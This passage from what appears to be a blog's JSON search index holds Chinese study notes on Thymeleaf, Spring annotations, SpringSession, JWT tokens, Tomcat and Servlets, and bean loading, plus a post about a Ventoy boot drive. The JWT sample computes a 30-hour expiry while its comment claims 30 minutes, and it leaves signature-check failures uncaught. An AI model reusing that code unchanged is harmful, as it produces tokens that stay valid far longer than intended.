th:if=&quot;$&#123;20&gt;5&#125;&quot;&gt;20&gt;5&lt;/p&gt;\nboolean字面量&lt;p th:if=&quot;isLogin == true&quot;&gt;用户已登录&lt;/p&gt;\nnull字面量&lt;p th:if=&quot;student != null&quot;&gt;有student数据&lt;/p&gt;\n\n字符串链接\n使用单引号括起来的字符串，使用 + 连接其他字符串或表达式&lt;p th:text=&quot;&#x27;我是&#x27; + $&#123;name&#125;&quot;&gt;数据显示&lt;/p&gt;\n使用双竖线，|字符串和表达式|&lt;p th:text=&quot;|我是$&#123;name&#125;|&quot;&gt;显示数据&lt;/p&gt;\n\n运算符算数运算：+,-,*,&#x2F;关系比较：&gt;,&lt;,&gt;&#x3D;,&lt;&#x3D;(gt,lt,ge,le)相等判断：&#x3D;&#x3D;,!&#x3D;(eq,ne)\n&lt;p th:text=&quot;$&#123;age &gt; 20&#125;&quot;&gt;年龄大于20&lt;/p&gt;&lt;p th:text=&quot;$&#123;20 + 30&#125;&quot;&gt;显示运算结果&lt;/p&gt;&lt;p th:if=&quot;$&#123;student == null&#125;&quot;&gt;student是null&lt;/p&gt;&lt;p th:if=&quot;$&#123;student eq null&#125;&quot;&gt;student是null&lt;/p&gt;&lt;p th:if=&quot;$&#123;student ne null&#125;&quot;&gt;student不是null&lt;/p&gt;&lt;p th:if=&quot;$&#123;isLogin == true ? true : false&#125;&quot;&gt;&lt;/p&gt;\n\nThymeleaf基本对象模板引擎提供了内置对象，可以使用#开始引用。官方文档\n\n#request 表示 HttpServletRequest\n#session 表示 HttpSession\nsession 表示 Map对象，是#session的简单表达方式，用来获取session中指定key的值 #session.getAttribute(“loginname”)&#x3D;&#x3D;session.loginname\n\n&lt;h3&gt;内置对象#request,#session,session的使用&lt;/h3&gt;&lt;p&gt;获取作用域中的信息&lt;/p&gt;&lt;p th:text=&quot;$&#123;#requset.getAttribute(&#x27;requestData&#x27;)&#125;&quot;&gt;&lt;/p&gt;&lt;p th:text=&quot;$&#123;#session.getAttribute(&#x27;sessionData&#x27;)&#125;&quot;&gt;&lt;/p&gt;&lt;p th:text=&quot;$&#123;session.loginname&#125;&quot;&gt;&lt;/p&gt;&lt;h3&gt;使用内置对象的方法&lt;/h3&gt;&lt;p th:text=&quot;$&#123;#request.getRequestURL()&#125;&quot;&gt;&lt;/p&gt;&lt;p th:text=&quot;$&#123;#request.getRequestURI()&#125;&quot;&gt;&lt;/p&gt;&lt;p th:text=&quot;$&#123;#request.getQueryString()&#125;&quot;&gt;&lt;/p&gt;&lt;p th:text=&quot;$&#123;#request.getContextPath()&#125;&quot;&gt;&lt;/p&gt;&lt;p th:text=&quot;$&#123;#request.getServerName()&#125;&quot;&gt;&lt;/p&gt;&lt;p th:text=&quot;$&#123;#request.getServerPort()&#125;&quot;&gt;&lt;/p&gt;\n\n此外，还有很多工具类。提供string、date、集合的一些处理方法。此处不再列举，详细请查看官方文档。\n自定义模板模板是内容的复用，定义一次，在其他模板文件中多次使用。模板的使用：1.定义模板2.使用模板\n模板定义语法：\n&lt;div th:fragment=&quot;head&quot;&gt;    &lt;p&gt;hello world&lt;/p&gt;&lt;/div&gt;\n引用模板的语法：\n&lt;!--插入模板insert--&gt;&lt;div th:insert=&quot;~&#123; templatename :: selector&#125;&quot;&gt;&lt;/div&gt;&lt;!--templatename:文件名称--&gt;&lt;!--selector:自定义模板名称--&gt;&lt;div th:insert=&quot;templatename :: selector&quot;&gt;&lt;/div&gt;&lt;!--templatename:文件名称--&gt;&lt;!--selector:自定义模板名称--&gt;&lt;!--包含模板insert--&gt;&lt;div th:include=&quot;~&#123; templatename :: selector&#125;&quot;&gt;&lt;/div&gt;&lt;div th:include=&quot;templatename :: selector&quot;&gt;&lt;/div&gt;&lt;!--对于使用模板：有包含模板（th:include），插入模板（th:insert）--&gt;&lt;!--包含是替换原来的标签，插入只是插入--&gt;\n\n第十章 总结注解spring+springMVC+SpringBoot\n创建对象：@Controller：放在类上，创建控制器对象，注入到容器中。@RestController：放在类上，创建控制器对象，注入到容器中。作用：复合了@Controller合@ResponseBodey，使用这个注解，控制器方法返回值都是数据，没有视图。@Service：放在业务层实现类上，创建service对象，注入到容器。@Repository：放在dao层实现类上，创建dao对象，注入到容器。没有使用是因为dao对象是MyBatis框架通过代理生成的，不需要使用。@Component：放在类上，创建此类的对象，放入到容器中。\n赋值：@Value：简单类型的赋值。还可以使用它获取配置文件中的数据。@Autowired：引用类型赋值自动注入，支持byName，byType，默认是byType。放在属性或构造方法上，推荐放在构造方法上。@Qualifer：给引用类型赋值，使用byName。注：@Autowired，@Qualifer都是Spring框架提供的@Resource：来自jdk中的定义，javax.annotation。实现引用类型的自动注入，支持byName，byType。默认是byName，如果失败，再使用byType注入。在属性上使用\n其他：@Configuration：放在类上，表示这是个配置类，相当于xml配置文件。@Bean：放在方法上，把方法返回值对象，注入到spring容器中。@ImportResource：加载其他的xml配置文件，把文件中的对象注入到spring容器中。@PropertySource：读取其他的properties属性配置文件。@ComponentScan：扫描器，指定报名，扫描注解。@ResponseBody：放在方法上，表示方法返回值是数据，不是试视图。@RequestBody：把请求体中的方法读取出来，转为java对象使用。@ControllerAdvice：控制器增强，放在类上，表示此类提供了方法，可以对controller增强功能。@ExceptionHandler：处理异常，放在方法上。@Transcational：处理事务，放在service实现类的public方法上，表示此方法有事务。\nSpringBoot中的注解：@SpringBootApplication：放在启动类上，包含了@SpringBootConfiguration、@EnableAutoConfiguration、@ComponentScan\nMybatis相关注解：@Mapper：放在类上，让MyBatis找到接口，创建代理对象@MapperScan：放在主类上，指定扫描的包，将包中所有接口都创建代理对象。对象注入到容器中。@Param：放在dao接口的方法形参前，作为命名参数使用。\nDubbo注解：@DubboService：在提供者端使用，暴露服务，放在接口实现类上。@DubboReference：在消费者端使用，引用远程服务，放在属性上使用。@EnableDubbo：放在主类上，表示启用Dubbo功能。\n一些想法断断续续学了快一个月，springboot算是摆脱了众多的配置文件，对开发来说还是蛮友好的。关于Thymeleaf模板引擎，我感觉和jsp有点像。但我没有学习过jsp，只是浅浅的用过。模板引擎应该算不上前后端分离，不过它是在html文件的标签上增加内容，实现动态的功能，算是伪分离吧。前后端分离，人不分离。现在linux使用地还不是很熟练，后面打算细细地学习下linux的使用，因为web应用是要部署到linux服务器的，所以学习linux是必要的。后面换电脑也打算使用linux作为主操作系统，大概会选择deepin系统吧。目前要复习期末考试，考完后，会开始健康码网站的制作。后面的学习计划，大概有Nginx，Docker之类的，然后继续深入对spring系列框架的理解合使用。更远一些的，大概会去学一下vue，了解下前端，毕竟如果是一个人做网站的话，只有后端也是不太行的。好耶！可以使用springboot，告别那么多配置文件了。\n\n2022.5.29\n\n","categories":["学习笔记"],"tags":["java","SpringBoot"]},{"title":"SpringSession笔记","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SpringSession%E7%AC%94%E8%AE%B0/","content":"Session会话管理session与cookiesession：因为http协议是无状态的，所以一次会话结束后，下次再会话时，服务端并不知道是上次这个人，所以服务端需要记录用户的状态时，需要session机制来识别具体的用户。\ncookie：每次http请求时，客户端都会发送相应的cookie信息。大多数应用都是使用cookie来实现session跟踪的。即第一次创建session时，服务端在http协议中向客户端cookie中记录一个sessionID，以后每次请求会把这个会话id发送到服务端，这样服务端可以识别用户。\n如果cookie被禁用了，可以重写url，即将sessionID写到url中实现参数传递。（不过一般不会这么做\nSession机制存放过程：每次请求浏览器都会将Cookie数据传给Tomcat每次服务器响应请求都会携带一个Cookie数据，将SessionId写入浏览器（已有则会覆盖。 \n\ntomcat接受用户请求后，会从cookie中寻找name为sessionid的数据。\n如果Cookie中没有，则服务器需要创建一个新的Session对象及sessionid。\n如果有，则tomcat会获取这个数据，然后在Session容器中，根据sessionid获取数据。\n数据存在，表示这个session有效\n数据不存在，则表示这个session已经过期。tomcat会创建一个新的session及sessionid，记录并写入浏览器。\n\n\n\n\n\n集群后，session丢失的原因：多台tomcat之间无法共享session。tomcat容器关闭或重启，也会导致session会话失效。\nsession会话共享方案\n使用容器扩展插件来实现，比如就tomcat的tomcat-redis-session-manager插件，基于jetty的jetty-session-redis插件、memcatched-session-manager插件； 好处：无需改动代码 坏处：过于依赖容器，容器升级或更换，需要重新配置。底层是复制session到其他服务器，会有一定延迟，不能部署太多服务器。\n使用Nginx负载均衡的ip hash策略，实现用户每次访问都绑定到同一tomcat服务器，实现session总是存在。 局限性：ip不可变。其次，负载均衡时，如果某个服务器发生故障，会重新定位，也会跳到别的服务器。\n自己写一套session会话管理工具类。 比较灵活，但开发需要一些额外时间，同时功能可能较弱。（不要重复造轮子\n使用框架的会话管理工具，SpringSession。 不依赖容器，不惜要改代码。较为完美的方案\n\nSpringSession简介SpringSession是Spring家族中的一个子项目，提供了一组Api和实现，用于管理用户Session信息。它将servlet容器实现的httpSession替换为spring-session，专注于解决session管理问题，Session信息存储在Redis中，可简单快速且无缝的集成到应用中。\nSpringSession特性：\n\n提供用户session管理的api和实现\n提供HttpSession，以中立的方式取代web容器中的session\n支持集群的session处理，不必绑定到具体的web容器去解决集群下的session共享问题\n\nSpringSession redis依赖\n&lt;dependency&gt;    &lt;groupId&gt;org.springframework.session&lt;/groupId&gt;    &lt;artifactId&gt;spring-session-data-redis&lt;/artifactId&gt;&lt;/dependency&gt;\n\n然后，配置好redis。用户的session信息就会存储在redis中实现共享。\nSpringSession的实现原理大概的实现原理\n\n自定义Filter，实现doFilter方法\n集成HttpServletRequestWrapper、HttpServletResponseWrapper类，重写getSession等相关的方法，在这些方法中调用session存储容器的操作类。比如redis等\n在1中的doFilter里，new 2中自定义的request和response类，将他们分别传递到过滤器链上\n将这个过滤器配置到过滤器链的第一个位置上\n\n结尾以后深入了，应该会有补充。比如使用场景之类的目前经验不足，就写到这吧。\n","categories":["学习笔记"],"tags":["spring","session"]},{"title":"Token机制","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Token%E6%9C%BA%E5%88%B6/","content":"Token 是什么token 是令牌，是服务器生成的一串用于标记用户的字符串。每次请求时携带，让服务器知道请求是哪个用户发出的。（有状态的请求）\nWeb 1.0早期的网站大多是展示自己的内容，以期望更多人可以看到。类似于报社，博客之类的。并不在意用户是谁。\n内容由平台创造、控制、所有，最后获利的也是平台。\nWeb 2.0后来的网站，比如现在。大部分都需要登录才能使用，网站需要知道用户是谁，以提供更加个性化的服务或者广告投放。比如电商网站、视频网站。\n内容由用户创造、但归平台控制和所有。收益也是平台所有。收益的分配权在平台手中。\nWeb 3.0大概就是区块链所畅想的世界。内容由用户创造、归用户所有、由用户控制。并和平台协议分配利益。\n更多可以参考：一文读懂”什么是 Web 3.0 ？”关于 web3 了解不深，简单介绍。可能最主要的就是内容，或者说利益的归属权。下面回过去谈 token。\n和 token 目的相似的 sessionsession 是会话。在服务端保存了用户信息，用来区分请求是属于哪个用户的。session 是基于 cookie 实现的，他会在请求后携带一个 cookie JSESSIONID。也是一个用于标记用户的字符串。浏览器每次请求都会带上 cookie。所以和 token 基本一样。那么使用 token 的意义是什么？\n\n首先不同的浏览器对 cookie 是有不同的限制的，比如数量和大小上。\n其次就是，用户信息都存储在服务端的 session 中，用户量大的话，对服务器的压力也会大起来。那么为什么 token 同样是标记用户的字符串，不会有这个问题呢？因为 token 这个字符串是将用户信息进行加密所得到的字符串。服务端并不存储。有加密就有解密，所以 token 中不要写入敏感信息。\n最后，cookie 是存在跨域等问题的。而 token 可以写在请求头、请求体，甚至是 url 路径中传给服务端。简单点说，就是使用更加自由。\n\n另外，用户信息存在 token 中，还有个优点就是在分布式系统中，不需要同步用户信息。使用 session 的分布式系统往往需要考虑 session 的共享问题。之前写过一篇 spring session 的笔记，有一些 session 共享的方案。\n当然，token 也有缺点。那就是 token 一点生成，那么久无法撤销。因为服务端是不会任何存用户信息的，所以的用户信息都由 token 解密而来。 将过期时间写入 token 基本是必须的。服务端基本也只能通过这个判断 token 是否还有效。无法说在有效期内让这个 token 无效。（至少我没想到好方法。当然，如果在服务端存个标识。再判断是否有效。那么基本也就回到 session 了。没必要使用 token。\nJWTJWT 全称 JSON Web Token。是一个开放标准(rfc7519)，它定义了一种紧凑的、自包含的方式，用于在各方之间以 JSON 对象安全地传输信息。此信息可以验证和信任，因为它是数字签名的。JWT 可以使用密钥〈使用 HMAC 算法）或使用 RSA 或 ECDSA 的公钥&#x2F;私钥对进行签名。\nJWT 生成的 token 由三部分组成：\n\n标头（Header）\n有效载荷（Payload）\n签名（Signature）\n\n更详细的介绍：深入浅出之JWT(JSON Web Token)下面是 JWT 的使用示例代码\nmaven 依赖&lt;dependency&gt;    &lt;groupId&gt;com.auth0&lt;/groupId&gt;    &lt;artifactId&gt;java-jwt&lt;/artifactId&gt;    &lt;version&gt;4.4.0&lt;/version&gt;&lt;/dependency&gt;\n\n使用public class JWTUtil &#123;        // 密钥    private String secret;        /**     * 创建 token     */        public String createToken(User user) &#123;        return JWT.create()                .withExpiresAt(Instant.ofEpochMilli(System.currentTimeMillis() + 30 * 60 * 60 * 1000))  // 设置过期时间 30分钟                .withAudience(user.getUsername()) // 设置用户信息。可以放很多，但不要放敏感信息                .sign(Algorithm.HMAC256(secret)); // 指定签名算法    &#125;    /**     * 解析 token     */    public User decodeToken(String token) &#123;        String username;        try &#123;            username = JWT.decode(token).getAudience().get(0);            JWTVerifier jwtVerifier = JWT.require(Algorithm.HMAC256(secret)).build();            jwtVerifier.verify(token);        &#125; catch (JWTDecodeException e) &#123;            e.printStackTrace();            return null;        &#125;        return new User().setUsername(username);    &#125;&#125;\n\n多设备登录与单设备登录多设备登录，将每次登录都视为一个新用户即可。给他发放新的 token。\n单设备登录，需要记录用于区分用户设备的标识。实现登出功能，并让其余设备登出即可。\n使用 token 实现单设备登录的话，有些违背它的设计。使用 session 或许会更方便。因为单纯使用 token 是没办法实现登出功能的。\n单点登录 Single Sign On（简称SSO）单点登录，指在多系统应用群中登录一个系统，便可在其他所有系统中得到授权而无需再次登录，包括单点登录与单点注销两部分。什么是单点登录（SSO）\n实现单点登录，就需要多个系统共享用户信息。用户在系统A上登录了，系统A获取到的用户信息需要同步给系统B、系统C… 以达到用户访问系统B的时候，不需要再次登录。\n使用 session 的话，就是 session 同步的问题。\n\n使用 tomcat 集群 session 全局复制。每个 tomcat 里的 session 会完全同步。比较影响性能。\n将请求的 ip 进行哈希映射到对应的机器。就是同一用户的多次请求都请求的同一个服务器。只需要简单的配置，不要用额外的中间件。但他绕过了问题，并没有解决。\n使用中间件，比如 redis 存储 session。然后多服务器共享。\n\n使用 token 的话。就不需要那么麻烦了。因为用户信息就在 token 中。\n从单点登录的功能来看，token 的设计还是很巧妙的。不用额外中间件，不是很浪费性能，系统设计上也不会特别复杂。但是单纯使用 token，没法注销。有得必有失嘛\n更多的多系统设计可能会将登录单独做成一个系统。由它进行 session 的共享，或者 token 的签发。\ntoken 的续期其实 token 没有续期，严格来说，是给一个全新的 token。\ntoken 的有效期一般比较短，在小时级别。用户的在使用的过程中，token 过期了，需要重新登陆，体验上是比较差的。所以 token 的续期也是比较需要的功能。\n在单应用中，token 续期的实现可以在 token 验证时判断下剩余时间。小于一定值（半小时、一小时…）就生成新 token 加在响应里返回。当然需要前端的配合。当然生成次数需要做限制，不然 token 泄露之后，就可以无限访问了。\n在多应用中，上述的方式也是可以的。但使用两个 token 去实现会更好一些。access_token、refresh_token。用于访问的 token 和用于刷新访问 token 的刷新 token。access_token 有效期比较短（小时级别）。refresh_token 比较长（一周或者一个月等）。access_token 每次请求都会携带。当他过期时，前端需要使用 refresh_token 去获取一个新的 access_token。\n那么，它好在哪呢。\n更加安全？一开始我不是这么认为的。因为 token 有泄露的可能性，那么不管是 access_token 还是 refresh_token 都会泄露。但是，refresh_token 中可以存储 ip、设备标识等信息。与数据库中持久化的信息进行对比。因为 refresh_token 并不会在请求中频繁携带。更加复杂的验证也是可以接受的。即使泄露出去，也可以通过额外的信息使之失效。\n另一个用处可能是在开放平台。比如微信开放平台，有非常多的第三方小程序。用户从微信打开小程序进行使用时，经过用户授权，给小程序签发 access_token 和 refresh_token。小程序服务端存放 refresh_token，小程序客户端存放 access_token。用户使用过程中，不会出现 access_token 过期的情况。短期内再次使用也不需要重新授权。微信能通过 refresh_token 知道哪个用户使用了哪个小程序。小程序能获取用户信息，同时也不会知道用户密码之类的敏感信息。\nEND这个回答很好：为什么使用双 token 的回答其实单 token 和 session 没啥区别。单系统确实是这样，多系统的话，省去了 session 同步，但也有代价。用处最大的地方，应该就是开放平台。出于对第三方客户端和链路安全的不信任而设计使用双 token。\n这个世界没那么多复杂需求。哪个合适用哪个。点名批评我自己关于墨夏的出入库系统的设计。\n","categories":["学习笔记"],"tags":["cookie","session","token","单点登录","JWT"]},{"title":"Tomcat执行流程与Servlet","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Tomcat%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E4%B8%8EServlet/","content":"Tomcat 简介Tomcat 服务器是一个免费的开放源代码的 Web 应用服务器。应用十分广泛，毕竟免费好用。\nTomcat 官网Tomcat 与 servlet、jsp、jdk 的版本支持\nTomcat 目录结构：\n\n\n\n目录\n说明\n\n\n\nbin\n命令中心（启动、关闭等命令）\n\n\nconf\n配置中心（核心配置 server.xml）\n\n\nlib\nTomcat 的库文件。Tomcat 运行时需要的 jar 包所在的目录。\n\n\nlogs\n存放日志文件。\n\n\ntemp\n存储临时产生的文件，即缓存。\n\n\nwebapps\n存放项目的文件，web 应用放置到此目录下浏览器可以直接访问。\n\n\nwork\n存放编译以后的 class 文件。\n\n\n下载 tomcat 压缩包后，解压并启动 tomcat便可以看见如下画面，即启动成功。\n部署应用，将 web 项目打包成 war 包，放在 webapps 目录下启动 tomcat 即可。\nTomcat 执行流程Tomcat 是 Http 服务器 + Servlet 容器。对我们屏蔽了应用层和网络层的协议（即不用我们去处理 TCP 连接，以及对 HTTP 报文的解析），给我们提供了标准的 Request 和 Response 对象。我们只需要从 request 中获取请求参数，然后调用业务逻辑，最后构建 Response 对象返回即可。至于 TCP 连接 和 HTTP 协议的数据处理和响应，Tomcat 会帮我们完成。实现了 HTTP 服务器与业务类的解耦。\n详细架构就不仔细介绍了，放几篇文章：\nTomcat 架构原理解析到架构设计借鉴四张图带你了解Tomcat系统架构Tomcat 的体系结构（超详细）\n介绍执行流程之前，先介绍几个概念（上面的文章中也有）：\n\nServer：服务器，启动一个 tomcat 就是启动了一个服务器，一个 Server 可以有多个 Service ，一个 Service 可以有多个 Connector 和 Engine\nService：服务，一个 server 可以包含多个 service 一个 service 维护多个 Connector 和一个 Engine\nEngine：叫引擎，也有资料叫 Container ，一个服务可以开一个引擎，就是一个公司可以有很多个门，不同身份的人从不同的门进，但是具体干活的就一个部门。引擎负责处理请求，不需要考虑请求链接，协议等。\nContext：一个 Context 管理一个应用，其实就是我们写的程序。\nWrapper：每个都封装着一个 Servlet（当然只局限于普通的 Http 请求）。\n\n下面是 Tomcat 的执行流程：比如用户发送一个请求： http://localhost:8080/test/index.jsp\n\n我们的请求被发送到本机端口8080，被在那里侦听的 Coyote HTTP&#x2F;1.1 Connector 获得。\nConnector 把该请求交给它所在的 Service 的 Engine 来处理，并等待来自 Engine 的回应 。\nEngine 获得请求 localhost:8080&#x2F;test&#x2F;index.jsp ，匹配它所拥有的所有虚拟主机 Host ，我们的虚拟主机在 server.xml 中默认配置的就是 localhost。\nEngine 匹配到 name&#x3D;localhost 的 Host（即使匹配不到也把请求交给该 Host 处理，因为该 Host 被定义为该 Engine 的默认主机）。\nlocalhost Host 获得请求 &#x2F;test&#x2F;index.jsp ，匹配它所拥有的所有 Context。\nHost 匹配到路径为 &#x2F;test 的 Context（如果匹配不到就把该请求交给路径名为””的Context去处理）。\npath&#x3D;”&#x2F;test” 的 Context 获得请求 &#x2F;index.jsp，在它的 mapping table 中寻找对应的 servlet 。\nContext 匹配到 URL PATTERN 为 *.jsp 的 servlet，对应于 JspServlet 类。\n构造 HttpServletRequest 对象和 HttpServletResponse 对象，作为参数调用 JspServlet 的 doGet 或 doPost 方法 。\nContext 把执行完了之后的 HttpServletResponse 对象返回给 Host 。\nHost 把 HttpServletResponse 对象返回给 Engine 。\nEngine 把 HttpServletResponse 对象返回给 Connector 。\nConnector 把 HttpServletResponse 对象返回给客户 browser 。\n\n所以我们在使用 tomcat 时，不需要理会中间过程（HTTP怎么解析，TCP怎么连接）。只需要写好 servlet 和 对应的映射关系即可。\nServlet 简介Servlet（Server Applet） 是基于 Jakarta 技术的 Web 组件，由容器管理，可生成动态内容。与其他基于 Jakarta 技术的组件一样，servlet 是独立于平台的 Java 类，它们被编译为与平台无关的字节码，这些字节码可以动态加载到支持 Jakarta 技术的 Web 服务器中并由其运行。容器，有时也称为 servlet 引擎，是提供 servlet 功能的 Web 服务器扩展。Servlet 通过 servlet 容器实现的请求&#x2F;响应范式与 Web 客户端交互。\nServlet 容器是 Web 服务器或应用程序服务器的一部分，它提供发送请求和响应的网络服务、解码基于 MIME 的请求以及格式化基于 MIME 的响应。Servlet 容器还通过其生命周期包含和管理 Servlet。Servlet 容器可以内置到主机 Web 服务器中，也可以通过该服务器的本机扩展 API 作为附加组件安装到 Web 服务器。Servlet 容器也可以内置于或可能安装在支持 Web 的应用程序服务器中。所有 Servlet 容器都必须支持 HTTP 作为请求和响应的协议，但可以支持其他基于请求&#x2F;响应的协议，例如 HTTPS（基于 SSL 的 HTTP）。容器必须实现的 HTTP 规范的必需版本是 HTTP&#x2F;1.1 和 HTTP&#x2F;2。Java SE 8 是必须用来构建 Servlet 容器的底层 Java 平台的最低版本。\n更多可以参考菜鸟教程-servlet教程\nServlet 生命周期Servlet 生命周期可被定义为从创建直到毁灭的整个过程。\n以下是 Servlet 遵循的过程：\n\nServlet 初始化后调用 init () 方法。\nServlet 调用 service() 方法来处理客户端的请求。\nServlet 销毁前调用 destroy() 方法。\n\n最后，Servlet 是由 JVM 的垃圾回收器进行垃圾回收的。\n\n首次访问 servlet 时，init() 方法会被执行，并且会执行 service() 方法再次访问时，只会执行 service() 方法关闭 web 容器时，会执行 destroy() 方法\n\nServlet 使用创建 servlet 有三种方式：\n\n实现 javax.servlet.Servlet 接口。\n继承 javax.servlet.GenericServlet 类。\n继承 javax.servlet.http.HttpServlet 类。\n\n一般使用第三种方式进行 servlet 的创建。创建完成后，需要在 web.xml 中完成 servlet 的配置（映射关系之类的）才可以使用。\n例如：servlet:\npublic class ServletTest extends HttpServlet &#123;    @Override    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;        PrintWriter printWriter = resp.getWriter();        printWriter.println(&quot;ServletTest&quot;);    &#125;    @Override    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;        doGet(req, resp);    &#125;&#125;\n\n别忘了在 web.xml 中添加映射:\n&lt;web-app&gt;    &lt;servlet&gt;        &lt;servlet-name&gt;ServletTest&lt;/servlet-name&gt;        &lt;servlet-class&gt;servletProject.servlet.ServletTest&lt;/servlet-class&gt;    &lt;/servlet&gt;    &lt;servlet-mapping&gt;        &lt;servlet-name&gt;ServletTest&lt;/servlet-name&gt;        &lt;url-pattern&gt;/ServletTest&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;&lt;/web-app&gt;\n\nservlet 中详细的方法用法可以参考菜鸟教程，有比较详细的文档。关于 web.xml 中 servlet 的匹配规则也不详细列举了。\n关于 JSPJSP 全称 Java Server Pages，是一种动态网页开发技术。它使用 JSP 标签在 HTML 网页中插入 Java 代码。标签通常以 &lt;% 开头以 %&gt; 结束。JSP 是一种 Java servlet，主要用于实现 Java web 应用程序的用户界面部分。网页开发者们通过结合 HTML 代码、XHTML 代码、XML 元素以及嵌入 JSP 操作和命令来编写 JSP。\n由于 jsp 以及被淘汰了，所以就放个教程的链接。后面的内容也只是做简单介绍，不做具体使用。菜鸟教程-jsp教程\n首先，来讲下 jsp 出现的原因：因为 tomcat 的出现，我们只需要写 servlet 就可以完成 web 请求。但是 servlet 主要功能在于交互式地浏览和生成数据，生成动态 Web 内容。而动态响应的内容是写在 servlet（java代码）中的，即我们需要在 Java 中使用字符串拼接 html 页面。这显然是很麻烦，并且低效，阅读性差的工作。所以 jsp 就诞生了，既能写 java 代码，又能写 html。\nJSP 的实现原理：JSP 的本质其实还是 servlet。因为浏览器向服务器发送请求，无论访问什么资源，其实都是在访问 servlet。服务器在执行 jsp 的时候，首先把 jsp 编译成一个 Java（servlet） 文件，然后将 Java 文件编译为 class 文件，加载到容器中。最后和其他的 servlet 一样，创建实例，初始化，调用 service() 方法，将 html 返回给客户端。\nJSP 的缺点（不好用的地方）：\n\n动态资源与静态资源耦合在一起，无法做到前后端分离。并且服务端压力也大，一旦服务器出现问题，整个网站前后端一起寄。\n前端做好网页后，需要后端改成 jsp 页面。沟通成本巨大、出错的概率也大、修改起来也麻烦（需要双方的协同开发）、效率因此也低。\nJSP 必须要在支持 Java 的容器（tomcat）中运行，而无法使用 nginx 等。nginx 的性能很高。\n第一次请求 jsp ，需要经过编译。速度较慢。\n\n所以后面才会发展出视图解析器以及 Thymeleaf 模板引擎 等技术来解决前端资源根据需求动态生成的问题。再往后就是前后端更加彻底的分离，vue+springboot 这种，可以将静态资源完全交由前端处理，后端仅实现数据接口的模式。\nEND说白了就是解耦，专业的人干专业的事。\n","categories":["学习笔记"],"tags":["tomcat","servlet","jsp"]},{"title":"Ventoy！多系统启动u盘","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/Ventoy%EF%BC%81%E5%A4%9A%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8u%E7%9B%98/","content":"推荐推荐一个可以制作多系统启动u盘的工具—— Ventoy可以将u盘制作为可以安装多个系统的启动盘，同时可以正常当成u盘存储数据。\n安装方式非常简单，装系统也非常简单！文档甚至开源 github\n故事由于最近在冲动之下买了主板和CPU，不得已开始组装新电脑，需要装系统。(现在各个配件还在路上)加之，以前的 usb2.0 u盘已经坏了，工作的时候总是和用户借u盘，真是太尴尬了。所以在新的u盘到了之后便寻找并安装了 Ventoy，当天就往里塞了三个系统镜像。\n有趣的事情来了。第二天在徐州的用户那时，他们专门配了个新电脑用来跑我部署的程序。电脑很新！包装盒就在边上。但是打开系统的那一刻，我顿感不妙。如图：\n碰到国产系统了，大概率会有不兼容的事要发生。结果和我猜的也差不多。不兼容！因为用户的内网环境，需要VPN等软件登进内网。但是他们的软件没有麒麟系统的版本\n于是乎，在一顿等待之后。用户让我们装Windows系统。真是太巧合了，昨天刚到的u盘，为了新买的还在路上的电脑装下载的系统镜像。在今天就用上了。像是给我装机前的预习一样。\nF7 从u盘启动，安装 windows，之后重启，delete 进入bios，修改启动引导，完事。\n经典念诗环节\n然后就是赶高铁回家了。下班！\n","categories":["记录生活"],"tags":["系统","攒机"]},{"title":"bean的加载方式与加载控制","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/bean%E7%9A%84%E5%8A%A0%E8%BD%BD%E6%96%B9%E5%BC%8F%E4%B8%8E%E5%8A%A0%E8%BD%BD%E6%8E%A7%E5%88%B6/","content":"bean 加载方式XML 方式声明 bean&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;!--声明自定义 bean--&gt;    &lt;bean id=&quot;bookService&quot;          class=&quot;com.example.demo.service.impl.BookServiceImpl&quot;          scope=&quot;singleton&quot;/&gt;    &lt;!--声明第三方 bean--&gt;    &lt;bean id=&quot;dataSource&quot; class=&quot;com.alibaba.druid.pool.DruidDataSource&quot;/&gt;&lt;/beans&gt;\n\nXML 和 注解 声明 beanxml 配置很繁琐，所以提供了 注解 的声明方式。但依然要在 xml 文件中告诉 spring 需要扫描的包。即去哪里找到被注解声明的 bean\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans       http://www.springframework.org/schema/beans/spring-beans.xsd       http://www.springframework.org/schema/context       http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;    &lt;!--配置扫描的包，去扫描包中的加了注解需要声明 bean--&gt;    &lt;context:component-scan base-package=&quot;com.example.demo&quot;/&gt;&lt;/beans&gt;\n\n@Configurationpublic class DataSourceConfig&#123;    @Bean    public DruidDataSource getDataSource()&#123;        DruidDataSource dataSource = new DruidDataSource();        // 在这里做其余的配置，比如这个 bean 对象需要的属性（这里是数据源等信息） 等等..        return dataSource;    &#125;&#125;\n\n使用 @Component 及其衍生注解 @Controller、@Service、@Repository 定义 bean使用 @Bean 定义第三方 bean，并将其所在类定义为配置类或 bean。（一般使用 @Configuration 将其定义为配置类）\n注解方式声明配置类既然可以用注解声明 bean，那么配置信息也可以用注解声明。就可以彻底舍弃掉 xml 文件了。\n@ComponentScan(&#123;&quot;com.example.demo&quot;&#125;)public class SpringConfig&#123;    @Bean    public DruidDataSource getDataSource()&#123;        DruidDataSource dataSource = new DruidDataSource();        // 在这里做其余的配置，比如这个 bean 对象需要的属性（这里是数据源等信息） 等等..        // ...        return dataSource;    &#125;&#125;\n\n@Configuration 配置项如果不用于被扫描可以省略\n拓展1：FactoryBean初始化实现 FactoryBean 接口的类，可以实现对 bean 